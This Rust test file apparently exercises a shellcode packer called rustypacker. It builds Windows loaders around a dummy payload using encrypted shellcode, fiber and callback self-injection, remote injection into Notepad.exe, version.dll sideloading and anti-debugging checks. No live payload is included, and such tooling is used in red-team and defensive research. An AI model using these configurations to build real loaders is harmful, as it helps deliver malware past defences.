use std::collections::BTreeMap;
use std::path::PathBuf;
use std::sync::{Arc, Mutex};

use rustypacker::compose;
use rustypacker::logbus::Sink;
use rustypacker::spec::{
    BuildSeed, BuildSpec, CheckChoice, CheckId, EncryptionKind, LoaderKind, OutputForm,
    RemoteMethod, SelfInjectMethod, SideloadMode, SideloadSpec,
};

fn workdir(tag: &str) -> PathBuf {
    let p = std::env::temp_dir().join(format!("rustypacker_smoke_{tag}"));
    let _ = std::fs::remove_dir_all(&p);
    std::fs::create_dir_all(&p).unwrap();
    p
}

fn shell(dir: &std::path::Path) -> PathBuf {
    let p = dir.join("raw.bin");
    let bytes: Vec<u8> = (0..128u8).collect();
    std::fs::write(&p, bytes).unwrap();
    p
}

fn run(recipe: &BuildSpec) -> PathBuf {
    let buf = Arc::new(Mutex::new(String::new()));
    let sink = Sink::new(buf.clone());
    let result = compose::run(recipe, &sink);
    let log = buf.lock().unwrap().clone();
    let out = result.unwrap_or_else(|e| panic!("compose failed: {e}\n--- log ---\n{log}"));
    assert!(out.exists(), "{out:?} missing\n--- log ---\n{log}");
    out
}

fn fiber_exe(dir: &std::path::Path, kind: EncryptionKind, seed: u64) -> BuildSpec {
    BuildSpec {
        shellcode_path: shell(dir),
        delivery_path: dir.join("out.exe"),
        loader: LoaderKind::SelfInject {
            method: SelfInjectMethod::Fiber,
            format: OutputForm::Exe,
        },
        encryption: kind,
        checks: vec![],
        gpu_storage: false,
        seed: BuildSeed(seed),
    }
}

#[test]
#[ignore = "slow: invokes cargo build on the emitted crate"]
fn end_to_end_fiber_exe_xor8_no_checks() {
    let dir = workdir("fiber_exe");
    run(&fiber_exe(&dir, EncryptionKind::Xor8, 0xdead_beef_cafe_babe));
}

#[test]
#[ignore = "slow: invokes cargo build on the emitted crate"]
fn end_to_end_fiber_dll_aes_ctr() {
    let dir = workdir("fiber_dll");
    let recipe = BuildSpec {
        shellcode_path: shell(&dir),
        delivery_path: dir.join("out.dll"),
        loader: LoaderKind::SelfInject {
            method: SelfInjectMethod::Fiber,
            format: OutputForm::Dll {
                export: "Fn_PayloadRun".into(),
            },
        },
        encryption: EncryptionKind::AesCtr,
        checks: vec![],
        gpu_storage: false,
        seed: BuildSeed(0x1111_2222_3333_4444),
    };
    run(&recipe);
}

#[test]
#[ignore = "slow: invokes cargo build on the emitted crate"]
fn end_to_end_fiber_exe_rc4() {
    let dir = workdir("fiber_rc4");
    run(&fiber_exe(&dir, EncryptionKind::Rc4, 0x1234_5678_9abc_def0));
}

#[test]
#[ignore = "slow: invokes cargo build on the emitted crate"]
fn end_to_end_fiber_exe_khufu() {
    let dir = workdir("fiber_khufu");
    run(&fiber_exe(&dir, EncryptionKind::Khufu, 0x2222_4444_8888_1111));
}

#[test]
#[ignore = "slow: invokes cargo build on the emitted crate"]
fn end_to_end_fiber_exe_camellia() {
    let dir = workdir("fiber_camellia");
    run(&fiber_exe(&dir, EncryptionKind::CamelliaToy, 0xfedc_ba98_7654_3210));
}

#[test]
#[ignore = "slow: invokes cargo build on the emitted crate"]
fn end_to_end_fiber_exe_ecies() {
    let dir = workdir("fiber_ecies");
    run(&fiber_exe(&dir, EncryptionKind::Ecies, 0xabcd_ef01_2345_6789));
}

#[test]
#[ignore = "slow: invokes cargo build on the emitted crate"]
fn end_to_end_fiber_exe_gpu_storage() {
    let dir = workdir("fiber_gpu");
    let recipe = BuildSpec {
        shellcode_path: shell(&dir),
        delivery_path: dir.join("out.exe"),
        loader: LoaderKind::SelfInject {
            method: SelfInjectMethod::Fiber,
            format: OutputForm::Exe,
        },
        encryption: EncryptionKind::AesCtr,
        checks: vec![],
        gpu_storage: true,
        seed: BuildSeed(0xcafe_f00d_d00d_face),
    };
    run(&recipe);
}

fn selfinject(dir: &std::path::Path, method: SelfInjectMethod, seed: u64) -> BuildSpec {
    BuildSpec {
        shellcode_path: shell(dir),
        delivery_path: dir.join("out.exe"),
        loader: LoaderKind::SelfInject {
            method,
            format: OutputForm::Exe,
        },
        encryption: EncryptionKind::Xor8,
        checks: vec![],
        gpu_storage: false,
        seed: BuildSeed(seed),
    }
}

#[test]
#[ignore = "slow: invokes cargo build on the emitted crate"]
fn end_to_end_selfinject_calendar() {
    let dir = workdir("self_calendar");
    run(&selfinject(&dir, SelfInjectMethod::Calendar, 0x0a0a_0b0b_0c0c_0d0d));
}

#[test]
#[ignore = "slow: invokes cargo build on the emitted crate"]
fn end_to_end_selfinject_desktops() {
    let dir = workdir("self_desktops");
    run(&selfinject(&dir, SelfInjectMethod::Desktops, 0x1a1a_1b1b_1c1c_1d1d));
}

#[test]
#[ignore = "slow: invokes cargo build on the emitted crate"]
fn end_to_end_selfinject_winstations() {
    let dir = workdir("self_winsta");
    run(&selfinject(&dir, SelfInjectMethod::WinStations, 0x2a2a_2b2b_2c2c_2d2d));
}

#[test]
#[ignore = "slow: invokes cargo build on the emitted crate"]
fn end_to_end_selfinject_geoid() {
    let dir = workdir("self_geoid");
    run(&selfinject(&dir, SelfInjectMethod::GeoId, 0x3a3a_3b3b_3c3c_3d3d));
}

fn remote(dir: &std::path::Path, method: RemoteMethod, seed: u64) -> BuildSpec {
    BuildSpec {
        shellcode_path: shell(dir),
        delivery_path: dir.join("out.exe"),
        loader: LoaderKind::Remote {
            method,
            target_exe: "Notepad.exe".into(),
        },
        encryption: EncryptionKind::Xor8,
        checks: vec![],
        gpu_storage: false,
        seed: BuildSeed(seed),
    }
}

#[test]
#[ignore = "slow: invokes cargo build on the emitted crate"]
fn end_to_end_remote_earlycascade() {
    let dir = workdir("ec_exe");
    run(&remote(&dir, RemoteMethod::EarlyCascade, 0x5555_6666_7777_8888));
}

#[test]
#[ignore = "slow: invokes cargo build on the emitted crate"]
fn end_to_end_remote_earlycascade_rc4() {
    let dir = workdir("ec_rc4");
    let mut r = remote(&dir, RemoteMethod::EarlyCascade, 0xdead_c0de_1234_5678);
    r.encryption = EncryptionKind::Rc4;
    run(&r);
}

#[test]
#[ignore = "slow: invokes cargo build on the emitted crate"]
fn end_to_end_remote_ntcreatethreadex() {
    let dir = workdir("remote_nctex");
    run(&remote(&dir, RemoteMethod::NtCreateThreadEx, 0x4a4a_4b4b_4c4c_4d4d));
}

fn sideload_recipe(dir: &std::path::Path, mode: SideloadMode, seed: u64) -> Option<BuildSpec> {
    let target = PathBuf::from(r"C:\Windows\System32\version.dll");
    if !target.exists() {
        return None;
    }
    Some(BuildSpec {
        shellcode_path: shell(dir),
        delivery_path: dir.join("version.dll"),
        loader: LoaderKind::SelfInject {
            method: SelfInjectMethod::Fiber,
            format: OutputForm::DllSideload(SideloadSpec {
                target_dll: target,
                hijack_export: "GetFileVersionInfoW".into(),
                mode,
                original_name: "Shaping.dll".into(),
                use_absolute_path: false,
            }),
        },
        encryption: EncryptionKind::Xor8,
        checks: vec![],
        gpu_storage: false,
        seed: BuildSeed(seed),
    })
}

#[test]
#[ignore = "slow: invokes cargo build on the emitted crate; needs version.dll"]
fn end_to_end_sideload_pure() {
    let dir = workdir("sideload_pure");
    let Some(recipe) = sideload_recipe(&dir, SideloadMode::Sideload, 0x6a6a_6b6b_6c6c_6d6d) else {
        eprintln!("version.dll absent, skipping");
        return;
    };
    run(&recipe);
}

#[test]
#[ignore = "slow: invokes cargo build on the emitted crate; needs version.dll"]
fn end_to_end_sideload_proxy() {
    let dir = workdir("sideload_proxy");
    let Some(recipe) = sideload_recipe(&dir, SideloadMode::Proxy, 0x7a7a_7b7b_7c7c_7d7d) else {
        eprintln!("version.dll absent, skipping");
        return;
    };
    run(&recipe);
}

#[test]
#[ignore = "slow: invokes cargo build on the emitted crate"]
fn end_to_end_fiber_exe_all_checks() {
    let dir = workdir("fiber_all_checks");
    let mut delay_params = BTreeMap::new();
    delay_params.insert("ms".into(), "500".into());
    delay_params.insert("placement".into(), "between".into());

    let recipe = BuildSpec {
        shellcode_path: shell(&dir),
        delivery_path: dir.join("out.exe"),
        loader: LoaderKind::SelfInject {
            method: SelfInjectMethod::Fiber,
            format: OutputForm::Exe,
        },
        encryption: EncryptionKind::AesCtr,
        checks: vec![
            CheckChoice { id: CheckId::CheckRemote, params: BTreeMap::new() },
            CheckChoice { id: CheckId::DebugPort,   params: BTreeMap::new() },
            CheckChoice { id: CheckId::TebFlag,     params: BTreeMap::new() },
            CheckChoice { id: CheckId::VecInt3,     params: BTreeMap::new() },
            CheckChoice { id: CheckId::NtDelay,     params: delay_params },
        ],
        gpu_storage: false,
        seed: BuildSeed(0x9999_aaaa_bbbb_cccc),
    };
    run(&recipe);
}
